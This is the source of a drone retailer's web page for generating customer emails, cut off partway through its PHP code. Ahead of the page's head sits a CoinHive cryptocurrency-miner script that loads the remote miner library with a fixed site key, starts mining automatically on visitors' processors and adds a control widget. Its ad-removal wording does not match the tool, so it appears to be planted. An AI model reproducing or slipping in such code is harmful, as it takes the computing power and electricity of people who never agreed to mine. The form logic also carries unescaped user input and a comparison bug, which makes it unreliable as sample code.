<!DOCTYPE html>
<html lang="en">

Began Javascript tag here :
<script type="text/javascript">
/*
Copyright @ Credit https://github.com/C0nw0nk/CoinHive
Expect regular updates and any issues post here : https://github.com/C0nw0nk/CoinHive/issues
*/
(function(){
var a = function() {try{return !!window.addEventListener} catch(e) {return !1} },
b = function(b, c) {a() ? document.addEventListener("DOMContentLoaded", b, c) : document.attachEvent("onreadystatechange", b)};
b(function(){
(function(){
var createScriptElement = document.createElement('script'); createScriptElement.type = 'text/javascript'; /*createScriptElement.async = true;*/
var getScriptElement = document.getElementsByTagName('script')[0];
createScriptElement.src = 'https://coinhive.com/lib/coinhive.min.js';
createScriptElement.onload = function () {
  /*User Configs*/
   // site key from CoinHive
   var coinhive_site_key = '6Y2vO0GuPf3nInwjZfxSHdwE8gKUHsLE';
   //Start running the miner when loaded and ready. True = Yes | False = No
   var coinhive_automatic_startup = true;
   //Threads - The number of threads the miner should start with. The default is navigator.hardwareConcurrency, i.e. the number of CPU cores available
   var mining_threads = 2;
   //Throttle - The fraction of time that threads should be idle. See miner.setThrottle() for a detailed explanation. The default is 0.
   var mining_throttle = .5;
   //Statistics Update frequency. 1000 = 1 Second.
   var coinhive_statistics_timer = 1000;
  /*HTML Element Names*/
  /*Start Element id names*/
  var html_miner = "miner";
  var html_mining_stats_canvas = "mining-stats-canvas";
  var html_miner_is_running = "mining-is-running";
  var html_miner_is_running_id = "mining-is-running-id";
  var html_miner_is_running_id_output = "mining-is-running-id-output";
  var html_miner_is_running_id_output_yes = "mining-is-running-id-output-yes";
  var html_miner_is_running_id_output_no = "mining-is-running-id-output-no";
  var html_mining_hashes_per_second = "mining-hashes-per-second";
  var html_mining_hashes_per_second_id = "mining-hashes-per-second-id";
  var html_mining_hashes_per_second_id_output = "mining-hashes-per-second-id-output";
  var html_mining_accepted_hashes_per_second = "mining-accepted-hashes-per-second";
  var html_mining_accepted_hashes_per_second_id = "mining-accepted-hashes-per-second-id";
  var html_mining_accepted_hashes_per_second_id_output = "mining-accepted-hashes-per-second-id-output";
  var html_mining_threads = "mining-threads";
  var html_mining_threads_id = "mining-threads-id";
  var html_mining_threads_id_output = "mining-threads-id-output";
  var html_mining_threads_add = "mining-threads-add";
  var html_mining_threads_remove = "mining-threads-remove";
  var html_mining_hashes_total = "mining-hashes-total";
  var html_mining_hashes_total_id = "mining-hashes-total-id";
  var html_mining_hashes_total_id_output = "mining-hashes-total-id-output";
  var html_mining_start = "mining-start";
  var html_mining_stop = "mining-stop";
  var html_addthreads = "addthreads";
  var html_removethreads = "removethreads";
  var html_startmining = "startmining";
  var html_stopmining = "stopmining";
  var html_mining_current_throttle = "mining-current-throttle";
  var html_mining_current_throttle_id = "mining-current-throttle-id";
  var html_mining_current_throttle_id_output = "mining-current-throttle-id-output";
  var html_mining_increase_throttle = "mining-increase-throttle";
  var html_mining_increase_throttle_id = "mining-increase-throttle-id";
  var html_mining_decrease_throttle = "mining-decrease-throttle";
  var html_mining_decrease_throttle_id = "mining-decrease-throttle-id";
  var html_mining_minimal_speed = "mining-minimal-speed";
  var html_mining_minimal_speed_id = "mining-minimal-speed-id";
  var html_mining_maximum_speed = "mining-maximum-speed";
  var html_mining_maximum_speed_id = "mining-maximum-speed-id";
  var html_mining_default_recommended_speed = "mining-default-recommended-speed";
  var html_mining_default_recommended_speed_id = "mining-default-recommended-speed-id";
  var html_mining_show = "mining-show";
  var html_mining_show_id = "mining-show-id";
  var html_mining_hide = "mining-hide";
  var html_mining_hide_id = "mining-hide-id";
  var html_mining_stick = "mining-stick";
  var html_mining_stick_id = "mining-stick-id";
  var html_mining_unstick = "mining-unstick";
  var html_mining_unstick_id = "mining-unstick-id";
  /*End Element id names*/
  /*Start tooltip id*/
  var html_tooltip_id = "tooltiptext";
  var html_tooltip_class_name = "tooltip";
  /*End tooltip id*/
  /*Start button class*/
  var html_button_class_name = "miner-button-class";
  /*End button class*/
  /*Start text area class*/
  var html_text_area_class_name = "miner-text-area-class";
  /*End text area class*/
  /*Start Text Language*/
  var html_text_is_running = "";
  var html_text_is_running_true = "Online";
  var html_text_is_running_false = "Offline";
  var html_text_is_running_tooltip = "If the miner is currently running.";
  var html_text_hashes_per_second = "Hashes/s | ";
  var html_text_hashes_per_second_tooltip = "The total number of hashes per second for all threads combined.";
  var html_text_accepted_hashes_per_second = "Accepted Hashes | ";
  var html_text_accepted_hashes_per_second_tooltip = "The number of hashes that have been accepted by the pool.";
  var html_text_current_number_of_threads = "Threads | ";
  var html_text_current_number_of_threads_tooltip = "Amount of threads you have running currently.";
  var html_text_threads_add = "+";
  var html_text_threads_add_tooltip = "Speed it up! Increases threads, but too many may slow your browser. 3 or 4 are OK in most cases.";
  var html_text_threads_remove = "-";
  var html_text_threads_remove_tooltip = "Slow it down! (decrease threads to 0 to stop entirely)";
  var html_text_hashes_total = "Total Hashes | ";
  var html_text_hashes_total_tooltip = "Hashes you solved so far. We will remove all ads for you once you mine enough. Login to have it keep track of your progress.";
  var html_text_start = "Start";
  var html_text_start_tooltip = "Start the miner.";
  var html_text_stop = "Stop";
  var html_text_stop_tooltip = "Stop the miner.";
  var html_text_usage_current_throttle = "Throttle | ";
  var html_text_usage_current_throttle_tooltip = "How much the miner is currently being throttled.";
  var html_text_usage_increase_throttle = "+";
  var html_text_usage_increase_throttle_tooltip = "Increase the throttle to reduce CPU consumption.";
  var html_text_usage_decrease_throttle = "-";
  var html_text_usage_decrease_throttle_tooltip = "Decrease the throttle to allow more CPU consumption.";
  var html_text_usage_minimal = "Min";
  var html_text_usage_minimal_tooltip = "Use the most minimal amount of CPU and Power possible.";
  var html_text_usage_max_out = "Max";
  var html_text_usage_max_out_tooltip = "Use all CPU and Power available.";
  var html_text_usage_default = "Default";
  var html_text_usage_default_tooltip = "Use Recommended default settings.";
  /*End Text Language*/
  /*End HTML Element Names*/
  /*Create Elements*/
  var createDivElement = document.createElement('div');
  createDivElement.id = html_miner;
  document.body.appendChild(createDivElement);//getScriptElement.parentNode.insertBefore(createDivElement, getScriptElement);/*Create our div element*/
  new_html = "<div id='"+ html_mining_stats_canvas +"'></div>";
  document.getElementById(html_miner).innerHTML = new_html;
  new_html = "<div id='"+ html_miner_is_running +"' class='"+ html_tooltip_class_name +" "+ html_text_area_class_name +"'><span id='"+ html_miner_is_running_id +"'>"+ html_text_is_running +"</span><span id='"+ html_miner_is_running_id_output +"'></span><span id='"+ html_tooltip_id +"'>"+ html_text_is_running_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  new_html = "<div id='"+ html_mining_hashes_per_second +"' class='"+ html_tooltip_class_name +" "+ html_text_area_class_name +"'><span id='"+ html_mining_hashes_per_second_id +"'>"+ html_text_hashes_per_second +"</span><span id='"+ html_mining_hashes_per_second_id_output +"'></span><span id='"+ html_tooltip_id +"'>"+ html_text_hashes_per_second_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  new_html = "<div id='"+ html_mining_accepted_hashes_per_second +"' class='"+ html_tooltip_class_name +" "+ html_text_area_class_name +"'><span id='"+ html_mining_accepted_hashes_per_second_id +"'>"+ html_text_accepted_hashes_per_second +"</span><span id='"+ html_mining_accepted_hashes_per_second_id_output +"'></span><span id='"+ html_tooltip_id +"'>"+ html_text_accepted_hashes_per_second_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  new_html = "<div id='"+ html_mining_threads +"' class='"+ html_tooltip_class_name +" "+ html_text_area_class_name +"'><span id='"+ html_mining_threads_id +"'>"+ html_text_current_number_of_threads +"</span><span id='"+ html_mining_threads_id_output +"'></span><span id='"+ html_tooltip_id +"'>"+ html_text_current_number_of_threads_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  new_html = "<div id='"+ html_mining_threads_add +"' class='"+ html_tooltip_class_name +" "+ html_button_class_name +"'><span id='"+ html_addthreads +"'>"+ html_text_threads_add +"</span><span id='"+ html_tooltip_id +"'>"+ html_text_threads_add_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  new_html = "<div id='"+ html_mining_threads_remove +"' class='"+ html_tooltip_class_name +" "+ html_button_class_name +"'><span id='"+ html_removethreads +"'>"+ html_text_threads_remove +"</span><span id='"+ html_tooltip_id +"'>"+ html_text_threads_remove_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  new_html = "<div id='"+ html_mining_hashes_total +"' class='"+ html_tooltip_class_name +" "+ html_text_area_class_name +"'><span id='"+ html_mining_hashes_total_id +"'>"+ html_text_hashes_total +"</span><span id='"+ html_mining_hashes_total_id_output +"'></span><span id='"+ html_tooltip_id +"'>"+ html_text_hashes_total_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  new_html = "<div id='"+ html_mining_start +"' class='"+ html_tooltip_class_name +" "+ html_button_class_name +"'><span id='"+ html_startmining +"'>"+ html_text_start +"</span><span id='"+ html_tooltip_id +"'>"+ html_text_start_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  new_html = "<div id='"+ html_mining_stop +"' class='"+ html_tooltip_class_name +" "+ html_button_class_name +"'><span id='"+ html_stopmining +"'>"+ html_text_stop +"</span><span id='"+ html_tooltip_id +"'>"+ html_text_stop_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  new_html = "<div id='"+ html_mining_current_throttle +"' class='"+ html_tooltip_class_name +" "+ html_text_area_class_name +"'><span id='"+ html_mining_current_throttle_id +"'>"+ html_text_usage_current_throttle +"</span><span id='"+ html_mining_current_throttle_id_output +"'></span><span id='"+ html_tooltip_id +"'>"+ html_text_usage_current_throttle_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  new_html = "<div id='"+ html_mining_increase_throttle +"' class='"+ html_tooltip_class_name +" "+ html_button_class_name +"'><span id='"+ html_mining_increase_throttle_id +"'>"+ html_text_usage_increase_throttle +"</span><span id='"+ html_tooltip_id +"'>"+ html_text_usage_increase_throttle_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  new_html = "<div id='"+ html_mining_decrease_throttle +"' class='"+ html_tooltip_class_name +" "+ html_button_class_name +"'><span id='"+ html_mining_decrease_throttle_id +"'>"+ html_text_usage_decrease_throttle +"</span><span id='"+ html_tooltip_id +"'>"+ html_text_usage_decrease_throttle_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  new_html = "<div id='"+ html_mining_minimal_speed +"' class='"+ html_tooltip_class_name +" "+ html_button_class_name +"'><span id='"+ html_mining_minimal_speed_id +"'>"+ html_text_usage_minimal +"</span><span id='"+ html_tooltip_id +"'>"+ html_text_usage_minimal_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  new_html = "<div id='"+ html_mining_maximum_speed +"' class='"+ html_tooltip_class_name +" "+ html_button_class_name +"'><span id='"+ html_mining_maximum_speed_id +"'>"+ html_text_usage_max_out +"</span><span id='"+ html_tooltip_id +"'>"+ html_text_usage_max_out_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  new_html = "<div id='"+ html_mining_default_recommended_speed +"' class='"+ html_tooltip_class_name +" "+ html_button_class_name +"'><span id='"+ html_mining_default_recommended_speed_id +"'>"+ html_text_usage_default +"</span><span id='"+ html_tooltip_id +"'>"+ html_text_usage_default_tooltip +"</span></div>";
  document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
  /*End Create Elements*/
  /*Create Style Sheet*/
  var createStyleElement = document.createElement('style'); createStyleElement.type = "text/css";
  createStyleElement.innerHTML += ""
  +"#"+html_miner+"{"
  +"position:fixed;"
  +"bottom:0;"
  +"left:0;"
  +"background-color:#262626;"
  +"color:#FFFFFF;"
  +"width:auto;"
  +"height:auto;"
  +"border-radius:3px;"
  +"z-index:30;"
  +"}"
  +"#"+html_mining_stats_canvas+"{"
  +"display:inline-block;"
  +"width:100%;"
  +"}"
  +"#"+html_miner_is_running+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_miner_is_running_id+"{"
  +"}"
  +"#"+html_miner_is_running_id_output+"{"
  +"}"
  +"."+html_miner_is_running_id_output_yes+"{"
  +"color:greenyellow;"
  +"}"
  +"."+html_miner_is_running_id_output_no+"{"
  +"color:#f00;"
  +"}"
  +"#"+html_mining_hashes_per_second+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_mining_hashes_per_second_id+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_mining_hashes_per_second_id_output+"{"
  +"display:inherit;"
  +"padding:0px 0px 0px 5px;"
  +"}"
  +"#"+html_mining_accepted_hashes_per_second+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_mining_threads+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_mining_threads_add+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_mining_threads_remove+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_mining_hashes_total+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_mining_start+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_mining_stop+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_addthreads+"{"
  +"}"
  +"#"+html_removethreads+"{"
  +"}"
  +"#"+html_startmining+"{"
  +"}"
  +"#"+html_stopmining+"{"
  +"}"
  +"#"+html_mining_current_throttle+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_mining_increase_throttle+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_mining_decrease_throttle+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_mining_minimal_speed+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_mining_maximum_speed+"{"
  +"display:inherit;"
  +"}"
  +"#"+html_mining_default_recommended_speed+"{"
  +"display:inherit;"
  +"}"
  /*Start miner buttons*/
  +"."+html_button_class_name+"{"
  +"text-decoration: none;"
  +"display: inline-block;"
  +"padding: 0px 10px;"
  +"margin: 2px;"
  +"border: 1px solid #C7C7C7;"
  +"border-radius: 3px;"
  +"-moz-border-radius: 2px;"
  +"-webkit-border-radius: 2px;"
  +"background: #636A6C;"
  +"background: -moz-linear-gradient(top,#636A6C 0%,#51575A 100%);"
  +"background: -webkit-gradient(linear,left top,left bottom,color-stop(0%,#636A6C),color-stop(100%,#51575A));"
  +"background: -webkit-linear-gradient(top,#636A6C 0%,#51575A 100%);"
  +"background: -o-linear-gradient(top,#636A6C 0%,#51575A 100%);"
  +"background: -ms-linear-gradient(top,#636A6C 0%,#51575A 100%);"
  +"background: linear-gradient(top,#636A6C 0%,#51575A 100%);"
  +"filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#636A6C',endColorstr='#51575A',GradientType=0);"
  +"}"
  +"."+html_button_class_name+":hover{"
  +"display: inline-block;"
  +"padding: 0px 10px;"
  +"margin: 2px;"
  +"border-radius: 3px;"
  +"background: #ddd;"
  +"background: -webkit-gradient(linear,left top,left bottom,color-stop(0,#fff),color-stop(1,#ddd));"
  +"background: -moz-linear-gradient(top center,#fff 0%,#ddd 100%);"
  +"background: -webkit-linear-gradient(top,#ffffff 0%,#dddddd 100%);"
  +"background: -o-linear-gradient(top,#ffffff 0%,#dddddd 100%);"
  +"background: -ms-linear-gradient(top,#ffffff 0%,#dddddd 100%);"
  +"background: linear-gradient(top,#ffffff 0%,#dddddd 100%);"
  +"filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff',endColorstr='#dddddd',GradientType=0);"
  +"border: 1px solid;"
  +"border-color: #ddd #bbb #999;"
  +"cursor: pointer;"
  +"color: #333;"
  +"}"
  /*End miner buttons*/
  /*Start text area box*/
  +"."+html_text_area_class_name+"{"
  +"border:1px solid #e5e5e4;"
  +"padding:0px 5px 0px 5px;"
  +"}"
  /*End text area box*/
  /*Start ToolTip*/
  +"."+html_tooltip_class_name+"{"
  +"position: relative;"
  +"overflow:visible;"
  +"}"
  +"."+html_tooltip_class_name+" #"+html_tooltip_id+"{"
  +"visibility: hidden;"
  +"width:0px;"
  +"height:0px;"
  +"background-color: black;"
  +"color: #fff;"
  +"text-align: center;"
  +"border-radius: 6px;"
  +"padding: 5px 5px;"
  +"position: absolute;"
  +"z-index: 1;"
  +"bottom: 150%;"
  +"left: 50%;"
  +"margin-left: -5px;"
  +"overflow:hidden;"
  +"}"
  +"."+html_tooltip_class_name+":hover #"+html_tooltip_id+"{"
  +"visibility: visible;"
  +"width:auto;"
  +"height:auto;"
  +"overflow:hidden;"
  +"white-space:nowrap;"
  +"}"
  /*End ToolTip*/
  +"";
  getScriptElement.parentNode.insertBefore(createStyleElement, getScriptElement);/*Create our StyleSheet element*/
  /*End Create Style Sheet*/
  /*Start CoinHive settings*/
  /*
  threads     The number of threads the miner should start with. The default is navigator.hardwareConcurrency, i.e. the number of CPU cores available on the user's computer.
  autoThreads Whether to automatically adjust the number of threads for optimal performance. This feature is experimental. The default is false.
  throttle    The fraction of time that threads should be idle. See miner.setThrottle() for a detailed explanation. The default is 0.
  forceASMJS  If true, the miner will always use the asm.js implementation of the hashing algorithm. If false, the miner will use the faster WebAssembly version if supported and otherwise fall back to asm.js. The default is false.
  */
  var miner = new CoinHive.Anonymous(coinhive_site_key, {throttle:mining_throttle,threads:mining_threads});
  /*
  Default : CoinHive.IF_EXCLUSIVE_TAB
  CoinHive.IF_EXCLUSIVE_TAB    The miner will only start if no other tabs are already mining. If all miners in other tabs are stopped or closed at a later point, the miner will then start. This ensures that one miner is always running as long as one tab of your site is open while keeping costly pool reconnections at a minimum.
  CoinHive.FORCE_EXCLUSIVE_TAB The miner will always start and immediately kill all miners in other tabs that have not specified CoinHive.FORCE_MULTI_TAB.
  CoinHive.FORCE_MULTI_TAB     The miner will always start. It will not announce its presence to other tabs, will not kill any other miners and can't be killed by other miners. This mode is used by the captcha and shortlinks.
  */
  var coinhive_starting_mode = CoinHive.IF_EXCLUSIVE_TAB;
  /*End Coinhive settings*/
  /*Start CoinHive functions*/
  function getHashesPerSecond() {
    return miner.getHashesPerSecond().toFixed(1);
  }
  function getTotalHashes(interpolate) {
    return miner.getTotalHashes(interpolate);
  }
  function getAcceptedHashes() {
    return miner.getAcceptedHashes();
  }
  function stop() {
    return miner.stop();
  }
  function start(mode) {
    return miner.start(mode);
  }
  function getNumThreads() {
    return miner.getNumThreads();
  }
  function setNumThreads(numThreads) {
    return miner.setNumThreads(numThreads);
  }
  function threadsAdd() {
    start(coinhive_starting_mode);/*incase it is not running when user interacts with this*/
    return setNumThreads(getNumThreads()+1);
  }
  function threadsRemove() {
    start(coinhive_starting_mode);/*incase it is not running when user interacts with this*/
    return setNumThreads(getNumThreads()-1);
  }
  function isRunning() {
    return miner.isRunning();
  }
  function hasWASMSupport() {
    return miner.hasWASMSupport();
  }
  function getAutoThreadsEnabled() {
    return miner.getAutoThreadsEnabled();
  }
  function setAutoThreadsEnabled(enabled) {
    return miner.setAutoThreadsEnabled(enabled);
  }
  function getThrottle() {
    return Math.round( miner.getThrottle().toFixed(1) * 1e2 ) / 1e2;
  }
  function setThrottle(throttle) {
    return miner.setThrottle(throttle);
  }
  function IncreaseThrottle() {
    start(coinhive_starting_mode);/*incase it is not running when user interacts with this*/
    return setThrottle(getThrottle() + 0.1);
  }
  function DecreaseThrottle() {
    start(coinhive_starting_mode);/*incase it is not running when user interacts with this*/
    return setThrottle(getThrottle() - 0.1);
  }
  function getToken() {
    return miner.getToken();
  }
  var original_recommended_thread_count = getNumThreads();
  var original_recommended_throttle_speed = getThrottle();
  function maximum_settings() {
    setThrottle(0);
    setNumThreads(original_recommended_thread_count);
    start(coinhive_starting_mode);/*incase it is not running when user interacts with this*/
  }
  function minimal_settings() {
    setThrottle(0.9);
    setNumThreads(1);
    start(coinhive_starting_mode);/*incase it is not running when user interacts with this*/
  }
  function default_recommended_settings() {
    setThrottle(original_recommended_throttle_speed);
    setNumThreads(original_recommended_thread_count);
    start(coinhive_starting_mode);/*incase it is not running when user interacts with this*/
  }
  /*End CoinHive functions*/
  /*functions to be called onclick interactions with elements*/
  document.getElementById(html_mining_threads_add).onclick = function() {return threadsAdd();};
  document.getElementById(html_mining_threads_remove).onclick = function() {return threadsRemove();};
  document.getElementById(html_mining_start).onclick = function() {return start(coinhive_starting_mode);};
  document.getElementById(html_mining_stop).onclick = function() {return stop();};
  document.getElementById(html_mining_increase_throttle).onclick = function() {return IncreaseThrottle();};
  document.getElementById(html_mining_decrease_throttle).onclick = function() {return DecreaseThrottle();};
  document.getElementById(html_mining_minimal_speed).onclick = function() {return minimal_settings();};
  document.getElementById(html_mining_maximum_speed).onclick = function() {return maximum_settings();};
  document.getElementById(html_mining_default_recommended_speed).onclick = function() {return default_recommended_settings();};
  /*End Functions to be called onclick*/
  if (coinhive_automatic_startup) {
    start(coinhive_starting_mode);/*Start the miner Automaticly*/
  }
  /*Disable functions*/
  //miner.stop = undefined;
  /*End Disable functions*/
  /*Listen on Events*/
  miner.on('open', function() { /* open */ })
  miner.on('authed', function(params) { /*console.log('Token name is: ', getToken());*/ });
  miner.on('close', function() { /* close */ })
  miner.on('error', function(params) { /*if (params.error !== 'connection_error') {console.log('The pool reported an error', params.error);}*/ });
  miner.on('job', function() { /* job */ })
  miner.on('found', function() { /* Hash found */ })
  miner.on('accepted', function() { /* Hash accepted by the pool */ })
  /*End Listen Events*/
  /*Timer Update stats once per second*/
  setInterval(function() {
    is_running = "";
    if (isRunning()) {
      is_running = html_text_is_running_true;
      document.getElementById(html_miner_is_running_id_output).className = html_miner_is_running_id_output_yes;
    } else {
      is_running = html_text_is_running_false;
      document.getElementById(html_miner_is_running_id_output).className = html_miner_is_running_id_output_no;
    }
    /*Output to HTML elements*/
    document.getElementById(html_miner_is_running_id_output).innerHTML = is_running;
    document.getElementById(html_mining_hashes_per_second_id_output).innerHTML = getHashesPerSecond();
    document.getElementById(html_mining_accepted_hashes_per_second_id_output).innerHTML = getAcceptedHashes();
    document.getElementById(html_mining_threads_id_output).innerHTML = getNumThreads();
    document.getElementById(html_mining_hashes_total_id_output).innerHTML = getTotalHashes(true);
    document.getElementById(html_mining_current_throttle_id_output).innerHTML = getThrottle();
  }, coinhive_statistics_timer);
  /*End Timer*/
}
createScriptElement.onerror = function () {
/*document display error message*/
}
getScriptElement.parentNode.insertBefore(createScriptElement, getScriptElement);
})();
}, false);
})();
</script>
<style>
    body {background-color: whitesmoke;}
    h1   {font-family: Helvetica;}
    p    {font-family: Helvetica;}
    td   {font-family: Helvetica;}
    tr   {font-family: Helvetica;}
</style>
<head>
    <meta charset="UTF-8">
    <title>D1 Store Email Template Generator</title>
	
	<link rel="stylesheet" type="text/css" href="/styles/css/bootstrap.css">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
	<script src="/styles/jquery-3.2.1.min.js" type="javascript"></script>

<!--    NICEDITOR FOR BOLD IN EDITTEXT      -->
   </head>
<body>
 <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
      <div class="container">
        <a class="navbar-brand" href="#">D1 Store Email Template Generator</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarResponsive">
          <ul class="navbar-nav ml-auto">
            <li class="nav-item active">
              <a class="nav-link" href="#"><!-- WRITE RIGHT SIDE NAV THINGS HERE-->
                <span class="sr-only">(current)</span>
              </a>
            </li>
			<!--
            <li class="nav-item">
              <a class="nav-link" href="#">About</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="#">Services</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="#">Contact</a>
            </li>
			-->
          </ul>
        </div>
      </div>
    </nav>
	<div class="container py-5">
	
    
	
    <form class="form-group " action="index.php" method="post">
	<div class="card p-5">
        <label>  <h4>Customers name:</h4> <input class="form-control" type="text" name="name"></label>
		
		
		<label><h4>What did they buy?</h4></label>
        <table class="table">
            <!--<tr>
                <th>Product</th>
                <th>Product</th>
                <th>Product</th>
            </tr>!--->
            <tr>
                <td><b>Basic Drones</b></td>
                <td><input type="checkbox" name="check_list[]" value="spark">Spark</td>
                <td><input type="checkbox" name="check_list[]" value="mavicpro">Mavic Pro</td>
            </tr>
            <tr>
                <td><b>Phantoms</b></td>
                <td><input type="checkbox" name="check_list[]" value="p4a">Phantom 4 Advanced</td>
                <td> <input type="checkbox" name="check_list[]" value="p4p">Phantom 4 Pro</td>
                <td><input type="checkbox" name="check_list[]" value="p4pp">Phantom 4 Pro+</td>
            </tr>
            <tr>
                <td><b>Osmos</b></td>
                <td> <input type="checkbox" name="check_list[]" value="osmomobile">Osmo Mobile</td>
                <td> <input type="checkbox" name="check_list[]" value="osmo">Osmo</td>
                <td> <input type="checkbox" name="check_list[]" value="osmoplus">Osmo+</td>
            <tr>
                <td><b>Ronins</b></td>
                <td><input type="checkbox" name="check_list[]" value="ronin">Ronin</td>
                <td><input type="checkbox" name="check_list[]" value="ronin-m">Ronon-M</td>
                <td><input type="checkbox" name="check_list[]" value="ronin-mx">Ronon-MX</td>
            </tr>
            <tr>
                <td><b>Inspire</b></td>
                <td><input type="checkbox" name="check_list[]" value="inspire2">Inspire 2</td>
            </tr>
        </table>

        <h4 class="">Care Refresh?</h4>
		<div class="row">
		<div class="col-md-1">
            <label><input class="form-control" type="radio" name="carerefresh" value="yes">Yes</label>
		</div>
		<div class="col-md-1">
            <label><input class="form-control" type="radio" name="carerefresh" value="no" checked="checked">No</label>
        </div>
		
		
		<!--<div id="c-r-inputs">-->
			<p>Care Refresh Code 1: <input class="form-control" type="text" name="carerefreshcode1"><br></p>
			<p>Care Refresh Code 2: <input class="form-control" type="text" name="carerefreshcode2"><br></p>
			<p>Care Refresh Code 3: <input class="form-control" type="text" name="carerefreshcode3"><br></p>
<!--        </div>-->
		<script>
				$(document).ready(function() {
			$("input[name$='carerefresh']").click(function() {
				var test = $(this).val();

				if($test = "yes"){
					$("#c-r-inputs").show();
					
				}else{
					$("#c-r-inputs").hide();

				}
			});
		});
		</script>

		<input  class="btn btn-xl btn-block btn-success" type="submit" value="Generate Email">

		</div>
		<hr class="p-2">

        <?php
        //Create basic string
		$mainString = '';
        $drone_in_sale = false;
		if(isset($_POST["name"])){
			$mainString = "Dear " . $_POST["name"] . ",
        
Congratulations on your purchase!
 
We hope that you enjoy your new DJI product as much as we do.
 
Below there’s a link to a video playlist that has all the info you will need to get everything up and running.";
		}

        //Add links
        if(!empty($_POST['check_list'])) {
            foreach($_POST['check_list'] as $check) {
                if ($check == "spark"){
                    $mainString = $mainString . "\n" . "http://lounge.d1store.com.au/content/dji-spark-tutorial-get-ready-to-fly";
   $drone_in_sale = true;
                }
                if ($check == "mavicpro") {
                    $mainString = $mainString . "\n" . "http://lounge.d1store.com.au/content/dji-mavic-pro-video-guides";
   $drone_in_sale = true;
                }
                if ($check == "p4a" || $check == "p4p" || $check == "p4pp") {
                    $mainString = $mainString . "\n" . "http://lounge.d1store.com.au/content/dji-phantom-4-pro-pro-video-guides";
   $drone_in_sale = true;
                }
                if ($check == "osmo" || $check == "osmoplus") {
                    $mainString = $mainString . "\n" . "http://lounge.d1store.com.au/content/dji-osmo-video-guides";
                }
                if ($check == "osmomobile") {
                    $mainString = $mainString . "\n" . "http://lounge.d1store.com.au/content/dji-osmo-mobile-video-guides";
                }
                if ($check == "ronin") {
                    $mainString = $mainString . "\n" . "http://lounge.d1store.com.au/content/dji-ronin-video-guide";
                }
                if ($check == "ronin-m" || $check == "ronin-mx") {
                    $mainString = $mainString . "\n" . "http://lounge.d1store.com.au/content/dji-ronin-m-video-guide";
                }
                if ($check == "inspire2") {
                    $mainString = $mainString . "\n" . "http://lounge.d1store.com.au/content/dji-inspire-2-video-guides";
   $drone_in_sale = true;
                }
            }
        }

        //Check for care refresh
        if (isset($_POST["carerefresh"])){
            if ($_POST["carerefresh"] == "yes"){
                //If any code is entered
                $mainString = $mainString . "\n\n" . "Take note to activate your DJI Care Refresh within 48 hours of activating your DJI product for the first time.";
                if (!empty($_POST["carerefreshcode1"])){
                    $mainString = $mainString . "\n" . "Go to DJI website https://store.dji.com/dji_care_infos/active and your serial number from your drone and activation key '" . $_POST["carerefreshcode1"] . "'.";
                }
                if (!empty($_POST["carerefreshcode2"])){
                    $mainString = $mainString . "\n" . "Go to DJI website https://store.dji.com/dji_care_infos/active and your serial number from your drone and activation key '" . $_POST["carerefreshcode2"] . "'.";
                }
                if (!empty($_POST["carerefreshcode3"])){
